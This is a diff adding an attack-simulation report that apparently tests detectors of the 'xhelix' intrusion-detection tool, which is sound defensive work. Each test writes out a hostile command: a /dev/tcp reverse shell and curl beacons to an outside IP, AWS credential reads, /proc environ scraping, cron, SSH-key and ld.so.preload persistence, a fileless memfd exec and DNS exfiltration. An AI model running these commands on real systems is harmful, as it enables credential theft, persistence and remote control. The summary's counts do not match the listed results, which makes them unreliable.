@@ -1,0 +1,226 @@
+
+════════════════════════════════════════════════════════════════
+PRE-FLIGHT
+════════════════════════════════════════════════════════════════
+prod host:       65.108.246.67
+C2 destination:  135.181.79.27 (user-owned dev box)
+xhelix version:  xhelix 0.0.2 (commit 5248706)
+kernel:          6.8.0-90-generic
+started at:      2026-05-22T19:36:21Z
+
+active sensors:
+sensor=started" sensor=heartbeat
+sensor=started" sensor=ebpf
+sensor=started" sensor=memory.dmesg
+sensor=started" sensor=procmem
+sensor=started" sensor=memdiff
+sensor=started" sensor=procscrape
+sensor=started" sensor=fim
+sensor=started" sensor=heartbeat
+sensor=started" sensor=ebpf
+sensor=started" sensor=memory.dmesg
+sensor=started" sensor=procmem
+sensor=started" sensor=memdiff
+sensor=started" sensor=procscrape
+
+Restarting xhelix so fangate marks newly-created plaintext file...
+xhelix restarted; alerts.jsonl offset reset for accurate counting.
+
+════════════════════════════════════════════════════════════════
+TEST A1 (credbroker) — Plaintext cred read by non-allowlisted process
+════════════════════════════════════════════════════════════════
+  expected:  credbroker.plaintext_read
+  attack:    cat /root/.aws/credentials > /dev/null
+  ✓ PASS: 1 matched (9s, noise=2)
+  matched rules:
+          1 credbroker.plaintext_read
+  noise (other rules):
+          2 cred_proc_scrape
+
+════════════════════════════════════════════════════════════════
+TEST A2 (credbroker) — Plaintext cred read by /tmp-resident binary
+════════════════════════════════════════════════════════════════
+  expected:  credbroker.plaintext_read
+  attack:    cp /bin/cat /tmp/exfil_tool && /tmp/exfil_tool /root/.aws/credentials > /dev/null; rm -f /tmp/exfil_tool
+
+════════════════════════════════════════════════════════════════
+TEST B1 (procscrape) — Scrape /proc/1/environ
+════════════════════════════════════════════════════════════════
+  expected:  cred_proc_scrape
+  attack:    head -c 100 /proc/1/environ > /dev/null
+
+════════════════════════════════════════════════════════════════
+TEST B2 (procscrape) — Mass /proc/*/environ scrape (harvester shape)
+════════════════════════════════════════════════════════════════
+  expected:  cred_proc_scrape
+  attack:    for p in 1 2 3 4 5 100 200 300; do head -c 80 /proc/$p/environ > /dev/null 2>&1; done
+  ✓ PASS: 33 matched (8s, noise=4)
+  matched rules:
+         24 cred_proc_scrape
+          9 cred_proc_scrape_environ_burst
+  noise (other rules):
+          4 deleted_binary_running
+
+════════════════════════════════════════════════════════════════
+TEST C1 (snicheck) — TLS without SNI to bare IP
+════════════════════════════════════════════════════════════════
+  expected:  tls_no_sni
+  attack:    echo | timeout 6 openssl s_client -connect 135.181.79.27:443 -noservername 2>/dev/null > /dev/null
+
+════════════════════════════════════════════════════════════════
+TEST E1 (ebpf.proc) — Reverse shell (bash <> /dev/tcp; stdin=socket)
+════════════════════════════════════════════════════════════════
+  expected:  reverse_shell|stdin_is_socket|web_server_spawns
+  attack:    timeout 4 bash -c 'bash -i >& /dev/tcp/135.181.79.27/14444 0>&1' 2>/dev/null; true
+
+════════════════════════════════════════════════════════════════
+TEST F1 (ebpf.proc) — memfd_create + fexecve (fileless dropper)
+════════════════════════════════════════════════════════════════
+  expected:  memfd|exec_from_memfd|from_memfd
+  attack:    python3 -c 'import os,ctypes; libc=ctypes.CDLL("libc.so.6"); fd=libc.memfd_create(b"x", 0); data=open("/bin/true","rb").read(); os.write(fd, data); os.execve("/proc/self/fd/"+str(fd), ["x"], {})' 2>/dev/null; true
+
+════════════════════════════════════════════════════════════════
+TEST G1 (ebpf.net) — Raw socket (BPFdoor passive-listener)
+════════════════════════════════════════════════════════════════
+  expected:  raw_socket
+  attack:    python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); s.close()' 2>/dev/null; true
+
+════════════════════════════════════════════════════════════════
+TEST H1 (ebpf.self) — bpf() syscall (BYOVD-class)
+════════════════════════════════════════════════════════════════
+  expected:  bpf_syscall
+  attack:    bpftool prog list >/dev/null 2>&1; true
+
+════════════════════════════════════════════════════════════════
+TEST I1 (ebpf.proc) — init_module syscall attempt
+════════════════════════════════════════════════════════════════
+  expected:  mod_load|kernel_module
+  attack:    python3 -c 'import ctypes; libc=ctypes.CDLL("libc.so.6"); buf=b"\\x00"*64; libc.syscall(175, buf, len(buf), b"")' 2>/dev/null; true
+
+════════════════════════════════════════════════════════════════
+TEST J1 (ebpf.memory) — RWX mprotect (in-memory loader)
+════════════════════════════════════════════════════════════════
+  expected:  mprotect_rwx
+  attack:    [ -x /tmp/rwx_mp ] && /tmp/rwx_mp; true
+  ✓ PASS: 1 matched (9s, noise=22)
+  matched rules:
+          1 mem_mprotect_rwx
+  noise (other rules):
+         15 cred_proc_scrape
+          4 deleted_binary_running
+          1 ungated
+          1 kernel_module_load
+          1 binary_runs_from_tmp
+
+════════════════════════════════════════════════════════════════
+TEST K1 (ebpf.net) — Outbound TCP connect to attacker IP
+════════════════════════════════════════════════════════════════
+  expected:  .
+  attack:    timeout 3 curl -s http://135.181.79.27:14445/x >/dev/null 2>&1; true
+
+════════════════════════════════════════════════════════════════
+TEST L1 (ebpf.proc) — ptrace cross-process attach
+════════════════════════════════════════════════════════════════
+  expected:  ptrace
+  attack:    sleep 60 & SLEEP_PID=$!; gdb -p $SLEEP_PID -batch -ex 'detach' -ex 'quit' 2>/dev/null; kill $SLEEP_PID 2>/dev/null; true
+
+════════════════════════════════════════════════════════════════
+TEST M1 (rules.proc) — Web-server lineage spawns shell (CVE-2025-49113 follow-on shape)
+════════════════════════════════════════════════════════════════
+  expected:  web_server_spawns_shell
+  attack:    cp /bin/bash /tmp/php-fpm && /tmp/php-fpm -c 'sh -c id' 2>/dev/null; rm -f /tmp/php-fpm; true
+      | uid=0(root) gid=0(root) groups=0(root)
+
+════════════════════════════════════════════════════════════════
+TEST N1 (rules.proc) — Execute binary from /tmp (dropper)
+════════════════════════════════════════════════════════════════
+  expected:  binary_runs_from_tmp
+  attack:    cp /bin/true /tmp/dropper_attack_$$ && /tmp/dropper_attack_$$ 2>/dev/null; rm -f /tmp/dropper_attack_$$; true
+
+════════════════════════════════════════════════════════════════
+TEST O1 (credbroker.honey) — Honey file touch (decoy)
+════════════════════════════════════════════════════════════════
+  expected:  honey
+  attack:    cat '/etc/xhelix/sealed/test.honey' >/dev/null 2>&1; true
+  ✓ PASS: 1 matched (9s, noise=14)
+  matched rules:
+          1 credbroker.honey_touched
+  noise (other rules):
+         10 cred_proc_scrape
+          4 deleted_binary_running
+
+TEST P1 — SKIPPED: uid 0 transition w/o setuid
+  reason: requires controlled priv-esc; risky on prod
+
+════════════════════════════════════════════════════════════════
+TEST Q1 (fim) — Cron unit drop (persistence)
+════════════════════════════════════════════════════════════════
+  expected:  cron
+  attack:    echo '* * * * * root /tmp/test_payload' > /etc/cron.d/xhelix_test_marker; sleep 2; rm -f /etc/cron.d/xhelix_test_marker
+
+════════════════════════════════════════════════════════════════
+TEST R1 (fim) — SSH authorized_keys append
+════════════════════════════════════════════════════════════════
+  expected:  authorized_keys|ssh_keys|fim
+  attack:    mkdir -p /root/.ssh; touch /root/.ssh/authorized_keys; cp -f /root/.ssh/authorized_keys /tmp/.ak.bak; echo 'ssh-rsa AAAATEST xhelix-attack-sim' >> /root/.ssh/authorized_keys; sleep 2; cp -f /tmp/.ak.bak /root/.ssh/authorized_keys; rm -f /tmp/.ak.bak
+
+════════════════════════════════════════════════════════════════
+TEST S1 (fim) — ld.so.preload write (rootkit-class)
+════════════════════════════════════════════════════════════════
+  expected:  ld_preload
+  attack:    [ -f /etc/ld.so.preload ] && cp /etc/ld.so.preload /tmp/.lsp.bak; echo '/tmp/evil.so' > /etc/ld.so.preload; sleep 2; if [ -f /tmp/.lsp.bak ]; then mv /tmp/.lsp.bak /etc/ld.so.preload; else rm -f /etc/ld.so.preload; fi
+      | ERROR: ld.so: object '/tmp/evil.so' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+      | ERROR: ld.so: object '/tmp/evil.so' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+
+════════════════════════════════════════════════════════════════
+TEST T1 (dnsexfil) — DNS exfil (60 high-entropy queries)
+════════════════════════════════════════════════════════════════
+  expected:  dns_exfil|dga
+  attack:    for i in $(seq 1 60); do dig $RANDOM$RANDOM.test-exfil.$i.example +short +timeout=1 +tries=1 >/dev/null 2>&1; done; true
+
+════════════════════════════════════════════════════════════════
+TEST U1 (beacon) — Beacon-shape (5 callbacks ~6s apart)
+════════════════════════════════════════════════════════════════
+  expected:  beacon
+  attack:    for i in 1 2 3 4 5; do timeout 2 curl -s http://135.181.79.27:14446/beacon$i >/dev/null 2>&1; sleep 6; done; true
+
+════════════════════════════════════════════════════════════════
+TEST V1 (integrity) — Unknown-binary execve (integrity)
+════════════════════════════════════════════════════════════════
+  expected:  integrity|first_seen|unknown_binary
+  attack:    cp /bin/true /usr/local/bin/xhelix_test_$$ && /usr/local/bin/xhelix_test_$$; rm -f /usr/local/bin/xhelix_test_$$; true
+
+TEST W1 — SKIPPED: Roundcube CVE-2025-49113 actual PoC
+  reason: no Roundcube creds available; post-exploitation behavior covered by M1/N1/A1
+
+════════════════════════════════════════════════════════════════
+FINAL SUMMARY
+════════════════════════════════════════════════════════════════
+
+Tests executed:  24
+  ✓ PASS:        4
+  ✗ FAIL:        0
+  ~ PARTIAL:     0
+  - SKIPPED:     2
+
+Detection rate:  18% (PASS / non-skipped)
+Pass+Partial:    18%
+
+Per-detector maturity (PASS-count grouped):
+  credbroker           1/1
+  credbroker.honey     1/1
+  ebpf.memory          1/1
+  procscrape           1/1
+
+False-positive (noise) summary:
+  total noise alerts: 42
+  A1: 2 noise alerts
+  B2: 4 noise alerts
+  J1: 22 noise alerts
+  O1: 14 noise alerts
+
+Detailed CSV: tests/attack-sim/comprehensive_2026-05-22/per-test-counts.csv
+Report:       tests/attack-sim/comprehensive_2026-05-22/report.txt
+
+Cleanup...
+done.
